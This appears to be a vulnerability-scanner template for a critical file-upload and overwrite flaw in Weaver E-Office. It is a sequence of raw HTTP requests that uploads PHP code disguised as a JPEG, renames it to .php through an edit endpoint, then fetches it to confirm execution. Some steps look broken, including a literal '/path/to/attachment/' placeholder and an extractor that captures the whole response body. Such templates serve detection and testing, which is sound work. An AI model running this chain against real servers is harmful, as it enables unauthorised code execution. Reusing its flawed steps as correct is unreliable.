id: weaver-eoffice-file-overwrite
info:
  name: Weaver E-Office File Overwrite Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Weaver E-Office is vulnerable to a privilege bypass, allowing attackers to upload arbitrary files and potentially gain control of the server.
  reference:
    - https://www.weaver.com.cn
http:
  - raw:
      - |
        GET /sample.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: session_cookie
        part: header
        regex:
          - "Set-Cookie: PHPSESSID=(.*?);"
        internal: true
  - raw:
      - |
        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary70AcDBrh15OE0Fd0
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close

        ------WebKitFormBoundary70AcDBrh15OE0Fd0
        Content-Disposition: form-data; name="name"

        1.jpg
        ------WebKitFormBoundary70AcDBrh15OE0Fd0
        Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
        Content-Type: image/jpeg

        <?php echo md5(233);unlink(__FILE__);?>
        ------WebKitFormBoundary70AcDBrh15OE0Fd0--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: uploaded_filename
        part: body
        regex:
          - "(?s)(.*)"
        internal: true
  - raw:
      - |
        POST /general/address/docenter/new_edit_do.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybZ4wB2Sk3KHNDWnB

        ------WebKitFormBoundarybZ4wB2Sk3KHNDWnB
        Content-Disposition: form-data; name="A1"

        test
        ------WebKitFormBoundarybZ4wB2Sk3KHNDWnB
        Content-Disposition: form-data; name="A2"

        男
        ------WebKitFormBoundarybZ4wB2Sk3KHNDWnB--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /general/address/docenter/new_edit_do.php?type=edit&ATTACHMENT_PIC=/path/to/attachment/{{uploaded_filename}}/1.jpg&ATTACHMENT_PIC_NAME=.php&add_id=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /general/address/view/address_edit.php?add_id=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: file_url
        part: body
        regex:
          - '<input type="hidden" name="FRIST_IMAGE" id="FRIST_IMAGE" value="(.*?)">'
        internal: true
  - raw:
      - |
        GET {{file_url}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "e165421110ba03099a1c0393373c5b43"
